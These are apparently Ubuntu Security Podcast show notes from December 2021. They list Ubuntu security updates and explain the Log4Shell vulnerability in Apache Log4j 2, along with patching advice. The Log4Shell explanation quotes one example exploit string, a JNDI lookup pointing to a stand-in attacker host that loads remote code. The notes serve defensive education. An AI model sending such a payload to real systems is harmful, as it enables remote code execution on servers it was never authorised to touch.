+++
title = "Episode 142"
description = """
  Just in time for the holidays, Log4Shell comes along to wreck everyone's
  weekend - so we take a deep dive into the vulnerability that has set the
  internet on fire, plus we cover security updates for BlueZ, Firefox,
  Flatpak and more.
  """
date = 2021-12-16T17:23:00+10:30
lastmod = 2021-12-16T17:28:20+10:30
draft = false
weight = 1001
episode_image = "img/usp_logo_500.png"
explicit = "no"
podcast_file = "USP_E142.mp3"
podcast_duration = "14:40"
podcast_bytes = 11056963
permalink = "https://ubuntusecuritypodcast.org/episode-142/"
guid = "76c9a80d8f71eff60bf88de32c2ee316a8d7306bd7751cedbfde05dcdad8cd4afafc75f1d0cf062ea25fc62d908817fb210b44f30244aa46fbbcd1c2acfba01a"
+++

## Overview {#overview}

Just in time for the holidays, Log4Shell comes along to wreck everyone's
weekend - so we take a deep dive into the vulnerability that has set the
internet on fire, plus we cover security updates for BlueZ, Firefox,
Flatpak and more.


## This week in Ubuntu Security Updates {#this-week-in-ubuntu-security-updates}

27 unique CVEs addressed


### [[USN-5183-1](https://ubuntu.com/security/notices/USN-5183-1)] BlueZ vulnerability [00:48] {#usn-5183-1-bluez-vulnerability-00-48}

-   1 CVEs addressed in Bionic (18.04 LTS)
    -   [CVE-2019-8922](https://ubuntu.com/security/CVE-2019-8922) <!-- medium -->
-   Heap based buffer overflow when handling overly large SDP requests -
    crash / possible code execution as a result


### [[USN-5186-1](https://ubuntu.com/security/notices/USN-5186-1)] Firefox vulnerabilities [01:08] {#usn-5186-1-firefox-vulnerabilities-01-08}

-   10 CVEs addressed in Bionic (18.04 LTS), Focal (20.04 LTS), Hirsute (21.04), Impish (21.10)
    -   [CVE-2021-43540](https://ubuntu.com/security/CVE-2021-43540) <!-- medium -->
    -   [CVE-2021-43546](https://ubuntu.com/security/CVE-2021-43546) <!-- medium -->
    -   [CVE-2021-43545](https://ubuntu.com/security/CVE-2021-43545) <!-- medium -->
    -   [CVE-2021-43543](https://ubuntu.com/security/CVE-2021-43543) <!-- medium -->
    -   [CVE-2021-43542](https://ubuntu.com/security/CVE-2021-43542) <!-- medium -->
    -   [CVE-2021-43541](https://ubuntu.com/security/CVE-2021-43541) <!-- medium -->
    -   [CVE-2021-43539](https://ubuntu.com/security/CVE-2021-43539) <!-- medium -->
    -   [CVE-2021-43538](https://ubuntu.com/security/CVE-2021-43538) <!-- medium -->
    -   [CVE-2021-43537](https://ubuntu.com/security/CVE-2021-43537) <!-- medium -->
    -   [CVE-2021-43536](https://ubuntu.com/security/CVE-2021-43536) <!-- medium -->
-   95.0


### [[USN-5189-1](https://ubuntu.com/security/notices/USN-5189-1)] GLib vulnerability [01:34] {#usn-5189-1-glib-vulnerability-01-34}

-   1 CVEs addressed in Trusty ESM (14.04 ESM), Xenial ESM (16.04 ESM), Bionic (18.04 LTS)
    -   [CVE-2021-3800](https://ubuntu.com/security/CVE-2021-3800) <!-- medium -->
-   By setting the `GLIB_CHARSETALIAS_DIR` env var, could then possibly exploit
    setuid binaries like `pkexec` which are linked against glib to possibly
    read root-owned files - fixed to just have glib not read and use this
    environment variable


### [[USN-5142-3](https://ubuntu.com/security/notices/USN-5142-3)] Samba regression [02:29] {#usn-5142-3-samba-regression-02-29}

-   9 CVEs addressed in Focal (20.04 LTS), Hirsute (21.04), Impish (21.10)
    -   [CVE-2021-3671](https://ubuntu.com/security/CVE-2021-3671) <!-- low -->
    -   [CVE-2021-3738](https://ubuntu.com/security/CVE-2021-3738) <!-- medium -->
    -   [CVE-2021-23192](https://ubuntu.com/security/CVE-2021-23192) <!-- medium -->
    -   [CVE-2020-25722](https://ubuntu.com/security/CVE-2020-25722) <!-- medium -->
    -   [CVE-2020-25721](https://ubuntu.com/security/CVE-2020-25721) <!-- medium -->
    -   [CVE-2020-25719](https://ubuntu.com/security/CVE-2020-25719) <!-- medium -->
    -   [CVE-2020-25718](https://ubuntu.com/security/CVE-2020-25718) <!-- medium -->
    -   [CVE-2020-25717](https://ubuntu.com/security/CVE-2020-25717) <!-- medium -->
    -   [CVE-2016-2124](https://ubuntu.com/security/CVE-2016-2124) <!-- medium -->
-   [Episode 138](https://ubuntusecuritypodcast.org/episode-138/), [Episode 141](https://ubuntusecuritypodcast.org/episode-141/) - yet another upstream regression in Samba due
    to the most recent set of security updates which we discussed a month ago
    in episode 138


### [[USN-5174-2](https://ubuntu.com/security/notices/USN-5174-2)] Samba regression {#usn-5174-2-samba-regression}

-   4 CVEs addressed in Bionic (18.04 LTS)
    -   [CVE-2021-3671](https://ubuntu.com/security/CVE-2021-3671) <!-- low -->
    -   [CVE-2020-25722](https://ubuntu.com/security/CVE-2020-25722) <!-- medium -->
    -   [CVE-2020-25717](https://ubuntu.com/security/CVE-2020-25717) <!-- medium -->
    -   [CVE-2016-2124](https://ubuntu.com/security/CVE-2016-2124) <!-- medium -->


### [[USN-5191-1](https://ubuntu.com/security/notices/USN-5191-1)] Flatpak vulnerability [02:48] {#usn-5191-1-flatpak-vulnerability-02-48}

-   1 CVEs addressed in Bionic (18.04 LTS), Focal (20.04 LTS), Hirsute (21.04), Impish (21.10)
    -   [CVE-2021-41133](https://ubuntu.com/security/CVE-2021-41133) <!-- medium -->
-   Possible to escape the flatpak sandbox by tricking services running on
    the host that they were not in fact communicating with a flatpak
    sandboxed application but with a regular unconfined application. As such
    they then wouldn't restrict the actions which they would perform on
    behalf of the flatpak'd application and so could allow it to then escape
    it's own confinement


### [[USN-5193-1](https://ubuntu.com/security/notices/USN-5193-1)] X.Org X Server vulnerabilities [03:26] {#usn-5193-1-x-dot-org-x-server-vulnerabilities-03-26}

-   4 CVEs addressed in Bionic (18.04 LTS), Focal (20.04 LTS), Hirsute (21.04), Impish (21.10)
    -   [CVE-2021-4011](https://ubuntu.com/security/CVE-2021-4011) <!-- medium -->
    -   [CVE-2021-4010](https://ubuntu.com/security/CVE-2021-4010) <!-- medium -->
    -   [CVE-2021-4009](https://ubuntu.com/security/CVE-2021-4009) <!-- medium -->
    -   [CVE-2021-4008](https://ubuntu.com/security/CVE-2021-4008) <!-- medium -->
-   4 different OOB writes that could be triggered by X clients - could then
    cause the X server to crash or possible code execution etc
-   In more recent releases, X runs as a regular user so impact is limited,
    and in most recent releases Ubuntu uses Wayland by default so it's
    possible that on modern desktops there is no X server running at all \o/


### [[USN-5192-1](https://ubuntu.com/security/notices/USN-5192-1)] Apache Log4j 2 vulnerability [04:12] {#usn-5192-1-apache-log4j-2-vulnerability-04-12}

-   1 CVEs addressed in Bionic (18.04 LTS), Focal (20.04 LTS), Hirsute (21.04), Impish (21.10)
    -   [CVE-2021-44228](https://ubuntu.com/security/CVE-2021-44228) <!-- high -->


### [[USN-5197-1](https://ubuntu.com/security/notices/USN-5197-1)] Apache Log4j 2 vulnerability {#usn-5197-1-apache-log4j-2-vulnerability}

-   1 CVEs addressed in Bionic (18.04 LTS), Focal (20.04 LTS), Hirsute (21.04), Impish (21.10)
    -   [CVE-2021-45046](https://ubuntu.com/security/CVE-2021-45046) <!-- high -->


## Goings on in Ubuntu Security Community {#goings-on-in-ubuntu-security-community}


### Log4Shell explodes the internet [04:20] {#log4shell-explodes-the-internet-04-20}

-   Vuln announced on [Twitter](https://web.archive.org/web/20211209230040/https://twitter.com/P0rZ9/status/1468949890571337731) late last Thursday / early Friday morning,
    linking to the upstream Github issue of a possible remote code execution
    vuln in Apache Log4j 2
-   Quickly it became apparent this was a high profile vuln that would affect
    a huge number of software products and have wide reaching consequences
-   Over the weekend started being picked up by [mainstream](https://www.abc.net.au/news/2021-12-11/log4shell-techs-race-to-fix-software-flaw/100692876) news not just the
    security industry
-   Since then vendors and distros etc have scrambled to patch the
    vulnerability
-   Ubuntu released updates on Monday - `2.15.0` for Ubuntu &gt;= 20.04 LTS and
    otherwise removed the offending class in Ubuntu 18.04 etc ([USN-5192-1](https://ubuntu.com/security/notices/USN-5192-1))
-   Stepping back
    -   What is Log4j?
        -   Extremely popular and widely used Java package for doing logging
            within applications
        -   Is the 252nd most popular component in Maven Central repo by download
            volume for November 2021
        -   Top 0.003% in popularity by downloads
        -   Also is a dependency in close to 7000 other open source projects - is
            even in the [Mars rover's Ingenuity helicopter](https://twitter.com/TheASF/status/1400875147163279374)
            -   Is in most other ASF software products (Struts, Spark, Kafka, Solr etc)
            -   Plus a huge number of other projects:
                -   Elastic Search, LogStash, GrayLog2, Minecraft (client and server)
                    -   Initial reports were this was first seen being exploited in
                        Minecraft
            -   Not to mention:
                -   Apple iCloud, Steam, Samsung Cloud storage and more
    -   What is the vulnerability?
        -   Vuln is in the JNDI (Java Naming and Directory Interface) feature of log4j
        -   JNDI allows Java objects to be referenced externally then loaded and used at runtime
        -   JNDI supports different protocols to fetch classes, including LDAP, even DNS etc
        -   Log4j supports lookups on variables which can encode a JNDI resource
        -   So if you log a variable such as `${jndi:ldap://attacker.com/malware}`
            Log4j will perform the lookup via LDAP to retrieve the Java class at
            that URI and then execute it
        -   Remote code execution attacks don't get any easier than this - esp
            since Java is write once, run anywhere - there is no architectural
            specific issues like with natively comiler languages like C/C++ etc
        -   As such wasn't surprising to see this given the highest possible CVSS
            score of 10.0 by ASF
    -   How widespread is this issue?
        -   As mentioned earlier so many different pieces of software use Log4j
            and have Log4j embedded within them, it is not just sufficient to say
            update your Ubuntu packaged version of log4j - if you are running
            custom / proprietary Java applications they may likely contain their
            own copy of Log4j2 and you may have to go and patch that directly
    -   How to patch manually?
        -   The easiest option would be to get an updated version of the
            application from the original vendor
        -   Failing that, could go looking for all log4j2 jar archives and then
            could extract these (jar's are zips afterall) and remove the
            offending class directly
            (`java/org/apache/logging/log4j/core/lookup/JndiLookup`)
    -   How is it being exploited?
        -   Kids popping Minecraft servers to other adversaries using this for
            more traditional attacks like deploying cryptominers etc - but given
            how widespread this issue is and how much coverage it has gotten it
            is likely everyone and anyone is looking to actively exploit it
-   Expect we will still be hearing about this for a long time - whether due
    to more vulns in Log4j2 but also since there are so many devices running
    Java out there and that likely have Log4j as part of that - could be a
    long tail of devices which take a long time (or even never get patched)
-   Could be the basis of the next Mirai style botnet of compromised devices?
-   In all the drama, it turned out there was a second vuln which could still
    be triggered to cause a least a DoS or possible [information leaking /
    exfiltration](https://www.praetorian.com/blog/log4j-2-15-0-stills-allows-for-exfiltration-of-sensitive-data/) - so a second upstream release `2.16.0` was done - this is now
    in Ubuntu &gt;= 20.04 LTS as well ([USN-5197-1](https://ubuntu.com/security/notices/USN-5197-1))
-   [KnowledgeBase article](https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/Log4Shell) for this on the Ubuntu wiki too if you want more
    specific information


### Ubuntu Security Podcast Holiday specials [12:52] {#ubuntu-security-podcast-holiday-specials-12-52}

-   Camila Camargo de Matos (aka mossoctopus) compiled a great 2-part series
    on cyber security threats and preparations for the holidays
-   Will be publishing that over the next couple weeks whilst the regular
    episodes take a break


### Ubuntu Security Podcast on break [13:37] {#ubuntu-security-podcast-on-break-13-37}

-   Will take a break for a few weeks and be back in early January
-   Wishing all listeners a safe and happy time if you are celebrating the
    holidays - fingers crossed 🤞 there is no more Log4Shell type
    vulnerabilities that drop during that time and everyone can have a proper
    break to recharge before 2022
-   We'll be back then to bring you all the news for Ubuntu Security again


## Get in contact {#get-in-contact}

-   [security@ubuntu.com](mailto:security@ubuntu.com)
-   [#ubuntu-security on the Libera.Chat IRC network](https://libera.chat)
-   [ubuntu-hardened mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
-   [Security section on discourse.ubuntu.com](https://discourse.ubuntu.com/c/security)
-   [@ubuntu\_sec on twitter](https://twitter.com/ubuntu%5Fsec)